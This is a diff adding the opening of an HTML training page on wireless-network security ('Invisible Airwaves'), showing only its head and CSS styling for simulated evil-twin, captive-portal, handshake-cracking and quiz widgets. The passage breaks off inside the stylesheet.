@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 4 — Invisible Airwaves</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500;700&family=Lora:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root{  --bg:#07080f;--bg2:#0c0d1a;--bg3:#101220;--bg4:#151728;--panel:#0d0f1e;  --v:#a855f7;--v2:#7c3aed;--vd:rgba(168,85,247,0.12);--vg:rgba(168,85,247,0.06);  --v-bright:#c084fc;--v-dim:#6d28d9;  --red:#ff4d6d;--red-dim:rgba(255,77,109,0.12);  --green:#00e5a0;--green-dim:rgba(0,229,160,0.1);  --amber:#f59e0b;--amber-dim:rgba(245,158,11,0.1);  --blue:#60a5fa;--blue-dim:rgba(96,165,250,0.1);  --text:#dde4f5;--text-dim:#6b7db3;--text-faint:#2d3a5e;  --bv:rgba(168,85,247,0.18);--bv2:rgba(168,85,247,0.07);  --radius:6px;  --font-head:'Syne',sans-serif;--font-mono:'JetBrains Mono',monospace;--font-body:'Lora',serif;}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:var(--font-body);font-size:17px;line-height:1.8;overflow-x:hidden;}
+    body::before{content:'';position:fixed;inset:0;z-index:999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.025) 2px,rgba(0,0,0,0.025) 4px);}
+    nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 2.5rem;height:56px;background:rgba(7,8,15,0.93);backdrop-filter:blur(14px);border-bottom:1px solid var(--bv2);}
+    .nav-logo{font-family:var(--font-mono);font-size:12px;color:var(--v);letter-spacing:0.12em;text-transform:uppercase;}
+    .nav-back{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);letter-spacing:0.08em;text-decoration:none;transition:color 0.2s;}
+    .nav-back:hover{color:var(--v);}
+    .nav-bar{width:180px;height:3px;background:var(--bg4);border-radius:2px;overflow:hidden;}
+    .nav-bar-fill{height:100%;background:linear-gradient(90deg,var(--v),var(--v-bright));border-radius:2px;transition:width 0.6s ease;box-shadow:0 0 8px var(--v);width:0%;}
+    .nav-pct{font-family:var(--font-mono);font-size:11px;color:var(--v);}
+    /* HERO */
+    .hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:80px 2.5rem 4rem;position:relative;overflow:hidden;}
+    .hero-rf{position:absolute;inset:0;z-index:0;pointer-events:none;}
+    .hero-corner{position:absolute;font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.1em;}
+    .hero-corner.tl{top:72px;left:2.5rem;}
+    .hero-corner.tr{top:72px;right:2.5rem;text-align:right;}
+    .hero-corner.bl{bottom:2rem;left:2.5rem;}
+    .hero-corner.br{bottom:2rem;right:2.5rem;text-align:right;}
+    .hero-inner{position:relative;z-index:1;max-width:880px;margin:0 auto;}
+    .hero-tag{display:inline-flex;align-items:center;gap:8px;font-family:var(--font-mono);font-size:11px;color:var(--v);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:2rem;}
+    .hero-tag::before{content:'';display:block;width:24px;height:1px;background:var(--v);box-shadow:0 0 6px var(--v);}
+    .hero h1{font-family:var(--font-head);font-size:clamp(2.8rem,7vw,5.2rem);font-weight:800;line-height:1.0;letter-spacing:-0.02em;color:#fff;margin-bottom:0.4rem;}
+    .hero h1 em{font-style:normal;color:var(--v);text-shadow:0 0 40px rgba(168,85,247,0.5);}
+    .hero-sub{font-family:var(--font-mono);font-size:12px;color:var(--text-dim);letter-spacing:0.06em;margin-bottom:2.5rem;}
+    .story-box{background:var(--bg2);border:1px solid var(--bv2);border-left:3px solid var(--v);border-radius:var(--radius);padding:2rem 2.2rem;margin-bottom:2.5rem;position:relative;overflow:hidden;}
+    .story-box::after{content:'';position:absolute;top:0;right:0;width:200px;height:100%;background:radial-gradient(ellipse at right,rgba(168,85,247,0.06),transparent);pointer-events:none;}
+    .story-label{font-family:var(--font-mono);font-size:10px;color:var(--v);letter-spacing:0.18em;text-transform:uppercase;margin-bottom:1rem;}
+    .story-box p{font-size:16px;color:var(--text);line-height:1.9;margin-bottom:0.9rem;}
+    .story-box p:last-child{margin-bottom:0;}
+    .story-box strong{color:#fff;}
+    .story-box em{color:var(--v);font-style:italic;}
+    .story-stat{display:inline-block;background:var(--vd);border:1px solid var(--bv);border-radius:3px;font-family:var(--font-mono);font-size:12px;color:var(--v-bright);padding:2px 8px;margin:0 2px;}
+    .hero-objectives{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1px;background:var(--bv2);border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin-bottom:3rem;}
+    .hero-obj-item{background:var(--panel);padding:1.2rem 1.4rem;display:flex;gap:12px;align-items:flex-start;}
+    .hero-obj-icon{font-family:var(--font-mono);font-size:11px;color:var(--v);background:var(--vd);border:1px solid var(--bv);border-radius:3px;padding:2px 6px;white-space:nowrap;margin-top:3px;flex-shrink:0;}
+    .hero-obj-text{font-size:14px;color:var(--text);line-height:1.5;font-family:var(--font-body);}
+    .btn-start{display:inline-flex;align-items:center;gap:10px;background:var(--v);color:#fff;font-family:var(--font-mono);font-size:13px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;padding:14px 28px;border-radius:var(--radius);border:none;cursor:pointer;text-decoration:none;transition:all 0.2s;box-shadow:0 0 24px rgba(168,85,247,0.35);}
+    .btn-start:hover{background:#fff;color:#000;transform:translateY(-1px);}
+    .section{max-width:900px;margin:0 auto;padding:5rem 2.5rem;}
+    .section-divider{border:none;border-top:1px solid var(--bv2);margin:0 2.5rem;}
+    .section-tag{font-family:var(--font-mono);font-size:10px;color:var(--v);letter-spacing:0.18em;text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:8px;}
+    .section-tag::before{content:'//';opacity:0.5;}
+    .section-num{color:var(--text-faint);}
+    .section h2{font-family:var(--font-head);font-size:clamp(1.8rem,4vw,2.8rem);font-weight:700;color:#fff;line-height:1.15;margin-bottom:1.2rem;letter-spacing:-0.01em;}
+    .section h2 em{font-style:normal;color:var(--v);}
+    .section>p{color:var(--text-dim);margin-bottom:1.2rem;font-size:16px;}
+    .explainer p{font-size:16.5px;color:var(--text-dim);line-height:1.9;margin-bottom:1.1rem;}
+    .explainer p strong{color:var(--text);}
+    .explainer p em{color:var(--v);font-style:italic;}
+    .explainer p code{font-family:var(--font-mono);font-size:13px;background:var(--bg3);border:1px solid var(--bv2);padding:1px 6px;border-radius:3px;color:var(--amber);}
+    .analogy-box{background:var(--bg2);border:1px solid rgba(96,165,250,0.2);border-left:3px solid var(--blue);border-radius:var(--radius);padding:1.4rem 1.6rem;margin:1.8rem 0;}
+    .analogy-label{font-family:var(--font-mono);font-size:10px;color:var(--blue);letter-spacing:0.18em;text-transform:uppercase;margin-bottom:0.6rem;}
+    .analogy-box p{font-size:15px;color:var(--text-dim);margin:0;line-height:1.8;}
+    .analogy-box p strong{color:#fff;}
+    .callout{border-left:3px solid var(--v);background:var(--vg);padding:1.2rem 1.5rem;border-radius:0 var(--radius) var(--radius) 0;margin:2rem 0;}
+    .callout-head{font-family:var(--font-mono);font-size:10px;color:var(--v);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:0.5rem;}
+    .callout p{margin:0;font-size:15px;color:var(--text);line-height:1.75;}
+    .callout p code{font-family:var(--font-mono);font-size:13px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--amber);}
+    .callout.green{border-left-color:var(--green);background:var(--green-dim);}
+    .callout.green .callout-head{color:var(--green);}
+    .callout.red{border-left-color:var(--red);background:var(--red-dim);}
+    .callout.red .callout-head{color:var(--red);}
+    /* PROTOCOL EVOLUTION TIMELINE */
+    .proto-timeline{margin:2rem 0;display:flex;flex-direction:column;gap:0;}
+    .proto-item{display:grid;grid-template-columns:90px 3px 1fr;gap:0 1.2rem;position:relative;}
+    .proto-year{font-family:var(--font-mono);font-size:12px;color:var(--text-faint);text-align:right;padding:1.4rem 0;letter-spacing:0.06em;}
+    .proto-line{display:flex;flex-direction:column;align-items:center;gap:0;}
+    .proto-dot{width:14px;height:14px;border-radius:50%;border:2px solid;flex-shrink:0;margin-top:1.6rem;z-index:1;}
+    .proto-dot.wep{border-color:var(--red);background:var(--red);}
+    .proto-dot.wpa{border-color:var(--amber);background:var(--amber);}
+    .proto-dot.wpa2{border-color:var(--blue);background:var(--blue);}
+    .proto-dot.wpa3{border-color:var(--green);background:var(--green);}
+    .proto-connector{flex:1;width:2px;background:var(--bv2);}
+    .proto-card{background:var(--panel);border:1px solid var(--bv2);border-radius:var(--radius);padding:1.2rem 1.4rem;margin:0.8rem 0 0.8rem 0;transition:border-color 0.2s;}
+    .proto-card:hover{border-color:var(--bv);}
+    .proto-card-head{display:flex;align-items:center;gap:10px;margin-bottom:0.5rem;}
+    .proto-card-name{font-family:var(--font-head);font-size:17px;font-weight:700;color:#fff;}
+    .proto-card-status{font-family:var(--font-mono);font-size:9px;padding:2px 8px;border-radius:3px;letter-spacing:0.12em;text-transform:uppercase;}
+    .status-broken{background:var(--red-dim);border:1px solid rgba(255,77,109,0.3);color:var(--red);}
+    .status-weak{background:var(--amber-dim);border:1px solid rgba(245,158,11,0.3);color:var(--amber);}
+    .status-strong{background:var(--blue-dim);border:1px solid rgba(96,165,250,0.3);color:var(--blue);}
+    .status-best{background:var(--green-dim);border:1px solid rgba(0,229,160,0.25);color:var(--green);}
+    .proto-card p{font-size:14.5px;color:var(--text-dim);line-height:1.75;margin-bottom:0.5rem;}
+    .proto-card p:last-child{margin-bottom:0;}
+    .proto-card p strong{color:var(--text);}
+    .proto-vuln{font-family:var(--font-mono);font-size:11px;background:var(--bg3);border:1px solid var(--bv2);border-radius:3px;padding:6px 10px;color:var(--text-faint);margin-top:0.6rem;line-height:1.6;}
+    .proto-vuln span{color:var(--red);}
+    /* 4-WAY HANDSHAKE */
+    .hs-diagram{margin:2rem 0;background:var(--bg2);border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;}
+    .hs-header{background:var(--bg3);padding:0.9rem 1.4rem;border-bottom:1px solid var(--bv2);font-family:var(--font-mono);font-size:11px;color:var(--v);letter-spacing:0.12em;text-transform:uppercase;}
+    .hs-body{padding:1.5rem;display:grid;grid-template-columns:130px 1fr 130px;gap:1rem;align-items:start;}
+    .hs-actor{text-align:center;}
+    .hs-actor-icon{font-size:28px;margin-bottom:6px;}
+    .hs-actor-name{font-family:var(--font-mono);font-size:11px;color:var(--v);font-weight:700;letter-spacing:0.08em;}
+    .hs-actor-sub{font-family:var(--font-mono);font-size:9px;color:var(--text-faint);}
+    .hs-messages{display:flex;flex-direction:column;gap:0.6rem;}
+    .hs-msg{display:flex;flex-direction:column;}
+    .hs-arrow{display:flex;align-items:center;gap:6px;}
+    .hs-arrow.ltr{flex-direction:row;}
+    .hs-arrow.rtl{flex-direction:row-reverse;}
+    .hs-arrow-line{flex:1;height:1px;background:var(--v);}
+    .hs-arrow.m2 .hs-arrow-line,.hs-arrow.m4 .hs-arrow-line{background:var(--v-bright);}
+    .hs-arrow-tip{color:var(--v);font-size:13px;}
+    .hs-msg-label{text-align:center;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);margin-top:3px;line-height:1.5;}
+    .hs-msg-label .msg-name{color:var(--v-bright);font-weight:700;}
+    .hs-msg-label .msg-desc{color:var(--text-faint);}
+    .hs-capture-note{background:var(--bg3);border-top:1px solid var(--bv2);padding:1rem 1.4rem;font-family:var(--font-mono);font-size:12px;color:var(--amber);text-align:center;letter-spacing:0.06em;}
+    /* CONCEPT CARDS */
+    .concept-grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--bv2);border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .concept-card{background:var(--panel);padding:1.6rem;}
+    .concept-card h4{font-family:var(--font-head);font-size:16px;font-weight:600;color:#fff;margin-bottom:0.3rem;}
+    .concept-card .fullform{font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.06em;margin-bottom:0.8rem;display:block;}
+    .concept-card p{font-size:14.5px;color:var(--text-dim);line-height:1.75;margin:0;}
+    .concept-card p strong{color:var(--text);}
+    .concept-card p code{font-family:var(--font-mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--amber);}
+    .tag{display:inline-block;font-family:var(--font-mono);font-size:9px;letter-spacing:0.12em;text-transform:uppercase;padding:3px 8px;border-radius:3px;margin-bottom:0.8rem;}
+    .tag-v{background:var(--vd);border:1px solid var(--bv);color:var(--v);}
+    .tag-red{background:var(--red-dim);border:1px solid rgba(255,77,109,0.3);color:var(--red);}
+    .tag-green{background:var(--green-dim);border:1px solid rgba(0,229,160,0.2);color:var(--green);}
+    .tag-blue{background:var(--blue-dim);border:1px solid rgba(96,165,250,0.2);color:var(--blue);}
+    .tag-amber{background:var(--amber-dim);border:1px solid rgba(245,158,11,0.25);color:var(--amber);}
+    /* IoT ATTACK CARDS */
+    .iot-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--bv2);border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .iot-card{background:var(--panel);padding:1.4rem;}
+    .iot-card-icon{font-size:28px;margin-bottom:0.6rem;}
+    .iot-card h4{font-family:var(--font-head);font-size:15px;font-weight:600;color:#fff;margin-bottom:0.3rem;}
+    .iot-card .iot-tag{font-family:var(--font-mono);font-size:9px;color:var(--red);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:0.6rem;display:block;}
+    .iot-card p{font-size:13.5px;color:var(--text-dim);line-height:1.7;margin:0;}
+    .iot-card p strong{color:var(--text);}
+    /* TERMINAL */
+    .terminal{background:#050610;border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin:1.5rem 0;font-family:var(--font-mono);}
+    .terminal-bar{background:var(--bg3);padding:0.6rem 1rem;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--bv2);}
+    .dot{width:10px;height:10px;border-radius:50%;}
+    .dot.r{background:#ff5f57;}
+    .dot.y{background:#febc2e;}
+    .dot.g{background:#28c840;}
+    .terminal-label{font-size:10px;color:var(--text-faint);letter-spacing:0.1em;margin-left:auto;}
+    .terminal-body{padding:1.2rem 1.5rem;}
+    .term-line{font-size:13px;line-height:2;display:flex;gap:0.5rem;align-items:baseline;}
+    .term-prompt{color:var(--v);}
+    .term-cmd{color:#fff;}
+    .term-out{color:var(--text-dim);margin-left:1.5rem;display:block;line-height:1.7;}
+    .term-out.hi{color:var(--amber);}
+    .term-out.ok{color:var(--green);}
+    .term-out.bad{color:var(--red);}
+    .term-out.faint{color:var(--text-faint);}
+    .term-out.v{color:var(--v);}
+    .term-cursor{display:inline-block;width:8px;height:14px;background:var(--v);animation:blink 1s step-end infinite;vertical-align:middle;margin-left:2px;}
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+    /* LAB */
+    .lab-wrap{border:1px solid var(--bv);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .lab-header{background:var(--bg2);padding:1.2rem 1.5rem;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--bv2);}
+    .lab-badge{background:var(--v);color:#fff;font-family:var(--font-mono);font-size:9px;font-weight:700;letter-spacing:0.15em;padding:4px 10px;border-radius:3px;}
+    .lab-title{font-family:var(--font-head);font-size:18px;font-weight:700;color:#fff;}
+    .lab-tabs{display:flex;background:var(--bg3);border-bottom:1px solid var(--bv2);}
+    .lab-tab{flex:1;padding:0.85rem;font-family:var(--font-mono);font-size:11px;letter-spacing:0.08em;text-align:center;cursor:pointer;border:none;background:transparent;color:var(--text-dim);border-bottom:2px solid transparent;transition:all 0.2s;text-transform:uppercase;}
+    .lab-tab.active{color:var(--v);border-bottom-color:var(--v);background:var(--vd);}
+    .lab-tab:hover:not(.active){color:var(--text);background:var(--bg4);}
+    .lab-body{padding:1.8rem;}
+    /* RADIO WAVE CANVAS */
+    .wave-canvas-wrap{position:relative;background:var(--bg3);border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin:1rem 0;}
+    #waveCanvas{display:block;width:100%;height:220px;}
+    .wave-legend{display:flex;gap:1.5rem;padding:0.7rem 1.2rem;background:var(--bg4);border-top:1px solid var(--bv2);flex-wrap:wrap;}
+    .wave-legend-item{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);display:flex;align-items:center;gap:6px;}
+    .wave-legend-dot{width:10px;height:10px;border-radius:50%;}
+    /* EVIL TWIN SIMULATOR */
+    .ap-scanner{background:var(--bg3);border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin:1rem 0;}
+    .ap-scanner-bar{background:var(--bg4);padding:0.6rem 1rem;font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.1em;border-bottom:1px solid var(--bv2);display:flex;justify-content:space-between;align-items:center;}
+    .ap-scanner-status{color:var(--v);}
+    .ap-list{display:flex;flex-direction:column;}
+    .ap-item{display:grid;grid-template-columns:24px 1fr auto auto auto;gap:0.8rem;align-items:center;padding:0.7rem 1rem;border-bottom:1px solid rgba(255,255,255,0.03);cursor:pointer;transition:background 0.15s;font-family:var(--font-mono);font-size:12px;}
+    .ap-item:last-child{border-bottom:none;}
+    .ap-item:hover{background:var(--bg4);}
+    .ap-item.evil{background:rgba(168,85,247,0.06);}
+    .ap-item.evil:hover{background:rgba(168,85,247,0.1);}
+    .ap-item.connected{background:rgba(0,229,160,0.06);}
+    .ap-icon{font-size:14px;text-align:center;}
+    .ap-ssid{color:var(--text);font-weight:500;}
+    .ap-ssid .evil-tag{color:var(--v);font-size:9px;margin-left:6px;border:1px solid var(--bv);padding:1px 5px;border-radius:2px;}
+    .ap-bssid{color:var(--text-faint);font-size:10px;}
+    .ap-signal{font-size:10px;}
+    .ap-signal.strong{color:var(--green);}
+    .ap-signal.medium{color:var(--amber);}
+    .ap-lock{font-size:12px;color:var(--text-faint);}
+    .ap-connect-btn{font-family:var(--font-mono);font-size:10px;padding:3px 10px;border-radius:3px;border:1px solid var(--bv);background:var(--vd);color:var(--v);cursor:pointer;transition:all 0.15s;letter-spacing:0.06em;}
+    .ap-connect-btn:hover{background:var(--v);color:#fff;}
+    .ap-connect-btn.connected-btn{border-color:rgba(0,229,160,0.3);background:var(--green-dim);color:var(--green);cursor:default;}
+    /* CAPTIVE PORTAL */
+    .captive-portal{background:#f8f9fa;border:1px solid #dee2e6;border-radius:var(--radius);overflow:hidden;margin:1rem 0;display:none;}
+    .captive-chrome{background:#e9ecef;padding:0.5rem 1rem;display:flex;align-items:center;gap:8px;border-bottom:1px solid #dee2e6;}
+    .captive-dots{display:flex;gap:4px;}
+    .captive-dot{width:10px;height:10px;border-radius:50%;}
+    .captive-url{flex:1;background:#fff;border:1px solid #ced4da;border-radius:3px;padding:3px 10px;font-family:var(--font-mono);font-size:12px;color:#495057;display:flex;align-items:center;gap:6px;}
+    .captive-body{padding:2rem;text-align:center;font-family:sans-serif;}
+    .captive-logo{font-size:48px;margin-bottom:0.5rem;}
+    .captive-title{font-size:20px;font-weight:700;color:#212529;margin-bottom:0.3rem;}
+    .captive-sub{font-size:13px;color:#6c757d;margin-bottom:1.5rem;}
+    .captive-form input{width:100%;max-width:300px;display:block;margin:0 auto 0.6rem;padding:8px 12px;border:1px solid #ced4da;border-radius:4px;font-size:14px;outline:none;}
+    .captive-form input:focus{border-color:#7c3aed;}
+    .captive-btn{background:#7c3aed;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;width:100%;max-width:300px;margin-top:0.3rem;}
+    .captive-note{font-size:11px;color:#adb5bd;margin-top:1rem;}
+    .captive-stolen{background:#1a1a2e;border:1px solid rgba(168,85,247,0.4);border-radius:var(--radius);padding:1rem 1.4rem;margin-top:1rem;font-family:var(--font-mono);font-size:12px;display:none;}
+    .captive-stolen-label{color:var(--red);font-size:10px;letter-spacing:0.15em;text-transform:uppercase;margin-bottom:6px;}
+    /* DEAUTH + CRACK */
+    .handshake-anim{background:var(--bg3);border:1px solid var(--bv2);border-radius:var(--radius);padding:1.5rem;margin:1rem 0;position:relative;overflow:hidden;}
+    .hs-anim-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:0.5rem;text-align:center;margin-bottom:1.2rem;}
+    .hs-anim-node{padding:0.8rem;background:var(--bg4);border:1px solid var(--bv2);border-radius:var(--radius);}
+    .hs-anim-node.active{border-color:var(--v);box-shadow:0 0 12px rgba(168,85,247,0.2);}
+    .hs-anim-node.captured{border-color:var(--amber);box-shadow:0 0 12px rgba(245,158,11,0.2);}
+    .hs-anim-icon{font-size:24px;margin-bottom:4px;}
+    .hs-anim-name{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);}
+    .hs-anim-ip{font-family:var(--font-mono);font-size:10px;color:var(--v);margin-top:2px;}
+    .hs-steps{display:flex;flex-direction:column;gap:6px;}
+    .hs-step{font-family:var(--font-mono);font-size:12px;padding:6px 12px;border-radius:3px;border:1px solid transparent;transition:all 0.3s;color:var(--text-faint);}
+    .hs-step.done{border-color:var(--green-dim);background:var(--green-dim);color:var(--green);}
+    .hs-step.active-step{border-color:var(--bv);background:var(--vd);color:var(--v);}
+    /* CRACK PROGRESS */
+    .crack-wrap{background:var(--bg3);border:1px solid var(--bv2);border-radius:var(--radius);padding:1.4rem;margin:1rem 0;}
+    .crack-label{font-family:var(--font-mono);font-size:10px;color:var(--v);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:1rem;}
+    .crack-bar-wrap{background:var(--bg4);border-radius:2px;height:6px;overflow:hidden;margin-bottom:0.6rem;}
+    .crack-bar{height:100%;background:linear-gradient(90deg,var(--v),var(--v-bright));border-radius:2px;transition:width 0.2s linear;width:0%;}
+    .crack-stats{display:flex;justify-content:space-between;font-family:var(--font-mono);font-size:11px;color:var(--text-faint);margin-bottom:1rem;}
+    .wordlist-scroll{background:var(--bg);border:1px solid var(--bv2);border-radius:3px;height:80px;overflow:hidden;font-family:var(--font-mono);font-size:11px;position:relative;}
+    .wordlist-inner{padding:0.4rem 0.8rem;color:var(--text-faint);line-height:1.8;position:absolute;transition:transform 0.1s linear;}
+    /* CMD CHIPS */
+    .cmd-palette{display:flex;flex-direction:column;gap:8px;margin-bottom:1.2rem;}
+    .cmd-chip{display:flex;align-items:flex-start;gap:10px;background:var(--bg3);border:1px solid var(--bv2);border-radius:var(--radius);padding:0.8rem 1rem;cursor:pointer;transition:all 0.2s;font-family:var(--font-mono);font-size:12px;color:var(--text-dim);}
+    .cmd-chip:hover:not(.used){border-color:var(--v);color:var(--v);background:var(--vd);}
+    .cmd-chip.used{opacity:0.4;pointer-events:none;}
+    .cmd-code{color:var(--amber);flex:1;line-height:1.5;}
+    .cmd-desc{font-size:10px;color:var(--text-faint);letter-spacing:0.06em;flex-shrink:0;margin-top:1px;}
+    @keyframes slideIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+    .mission-complete{animation:slideIn 0.4s ease forwards;border:1px solid var(--v);background:var(--vg);border-radius:var(--radius);padding:1.3rem 1.5rem;margin-top:1rem;}
+    .mc-head{font-family:var(--font-mono);font-size:11px;color:var(--v);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:0.5rem;}
+    .mission-complete p{font-size:15px;color:var(--text);line-height:1.8;margin:0;}
+    .mission-complete code{font-family:var(--font-mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--v);}
+    /* QUIZ */
+    .quiz-wrap{border:1px solid var(--bv2);border-radius:var(--radius);overflow:hidden;margin:2rem 0;}
+    .quiz-header{background:var(--bg2);padding:1rem 1.5rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--bv2);}
+    .quiz-header h4{font-family:var(--font-head);font-size:16px;font-weight:600;color:#fff;}
+    .quiz-score{font-family:var(--font-mono);font-size:12px;color:var(--text-faint);}
+    .quiz-q{padding:1.4rem 1.5rem;border-bottom:1px solid rgba(255,255,255,0.04);}
+    .quiz-q:last-child{border-bottom:none;}
+    .quiz-q-text{font-size:15.5px;color:var(--text);margin-bottom:1rem;font-family:var(--font-body);line-height:1.7;}
+    .quiz-options{display:flex;flex-direction:column;gap:8px;}
+    .quiz-option{display:flex;align-items:center;gap:10px;padding:10px 14px;border:1px solid rgba(255,255,255,0.06);border-radius:var(--radius);cursor:pointer;transition:all 0.15s;font-family:var(--font-mono);font-size:13px;color:var(--text-dim);}
+    .quiz-option:hover{border-color:var(--bv);color:var(--text);background:var(--vd);}
+    .quiz-option.correct{border-color:var(--green);background:var(--green-dim);color:var(--green);}
+    .quiz-option.wrong{border-color:var(--red);background:var(--red-dim);color:var(--red);}
+    .quiz-opt-key{width:22px;height:22px;border-radius:3px;background:var(--bg4);border:1px solid rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--text-faint);flex-shrink:0;}
+    .quiz-option.correct .quiz-opt-key{background:var(--green);border-color:var(--green);color:#000;}
+    .quiz-option.wrong .quiz-opt-key{background:var(--red);border-color:var(--red);color:#fff;}
+    .quiz-explain{margin-top:10px;padding:12px 16px;background:var(--bg2);border-radius:var(--radius);font-size:14px;color:var(--text-dim);font-family:var(--font-body);display:none;border-left:3px solid var(--v);line-height:1.7;}
+    .quiz-explain.show{display:block;}
+    /* COMPLETION */
+    .completion{text-align:center;padding:5rem 2.5rem;max-width:700px;margin:0 auto;display:none;flex-direction:column;align-items:center;opacity:0;transition:opacity 1s ease;}
+    .completion.visible{opacity:1;}
+    .completion-badge{width:100px;height:100px;border-radius:50%;background:var(--vd);border:2px solid var(--v);display:flex;align-items:center;justify-content:center;margin:0 auto 2rem;font-size:40px;box-shadow:0 0 40px rgba(168,85,247,0.3);}
+    .completion h2{font-family:var(--font-head);font-size:clamp(2rem,5vw,3.5rem);font-weight:800;color:#fff;margin-bottom:1rem;letter-spacing:-0.02em;}
+    .completion h2 em{font-style:normal;color:var(--v);}
+    .completion p{color:var(--text-dim);margin-bottom:2rem;font-size:16px;line-height:1.8;}
+    .completion-stats{display:flex;justify-content:center;gap:2rem;margin:2rem 0;flex-wrap:wrap;}
+    .stat-val{font-family:var(--font-mono);font-size:28px;font-weight:700;color:var(--v);display:block;}
+    .stat-label{font-family:var(--font-mono);font-size:10px;color:var(--text-faint);letter-spacing:0.12em;text-transform:uppercase;}
+    .btn-next{display:inline-flex;align-items:center;gap:10px;background:transparent;color:var(--v);font-family:var(--font-mono);font-size:13px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;padding:14px 28px;border-radius:var(--radius);border:1px solid var(--v);cursor:pointer;text-decoration:none;transition:all 0.2s;}
+    .btn-next:hover{background:var(--v);color:#fff;box-shadow:0 0 24px rgba(168,85,247,0.3);}
+    @media(max-width:640px){  
+      .concept-grid,.iot-grid{grid-template-columns:1fr;}  
+      .hs-body{grid-template-columns:80px 1fr 80px;}
+    }
+
+    /* FUTURISTIC GLASSMORPHIC KEY CARD */
+    .futuristic-flag-card {
+      background: rgba(13, 25, 34, 0.45);
+      backdrop-filter: blur(12px) saturate(180%);
+      -webkit-backdrop-filter: blur(12px) saturate(180%);
+      border: 1px solid rgba(168, 85, 247, 0.2);
+      border-radius: 10px;
+      padding: 2rem;
+      margin: 2.5rem auto;
+      max-width: 550px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 
+                  0 0 15px rgba(168, 85, 247, 0.05),
+                  inset 0 0 15px rgba(168, 85, 247, 0.05);
+      animation: pulseGlow 4s infinite alternate;
+    }
+
+    .futuristic-flag-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(168, 85, 247, 0.02),
+          rgba(168, 85, 247, 0.1),
+          rgba(168, 85, 247, 0.02),
+          transparent
+      );
+      transform: skewX(-15deg);
+      animation: scanLine 6s infinite linear;
+      pointer-events: none;
+    }
+
+    @keyframes scanLine {
+      0% { left: -150%; }
+      100% { left: 150%; }
+    }
+
+    @keyframes pulseGlow {
+      0% { border-color: rgba(168, 85, 247, 0.15); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 0 0 15px rgba(168, 85, 247, 0.05); }
+      100% { border-color: rgba(168, 85, 247, 0.4); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 0 0 25px rgba(168, 85, 247, 0.15); }
+    }
+
+    .flag-value {
+      font-family: var(--font-mono);
+      font-size: clamp(12px, 2.2vw, 15px);
+      color: var(--v-bright);
+      text-shadow: 0 0 10px rgba(168, 85, 247, 0.4);
+      background: rgba(4, 8, 11, 0.7);
+      border: 1px solid rgba(168, 85, 247, 0.15);
+      padding: 12px 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 1rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      letter-spacing: 0.05em;
+      position: relative;
+      z-index: 2;
+      word-break: break-all;
+      user-select: all;
+    }
+
+    .flag-value:hover {
+      background: rgba(168, 85, 247, 0.08);
+      border-color: rgba(168, 85, 247, 0.5);
+      transform: scale(1.02);
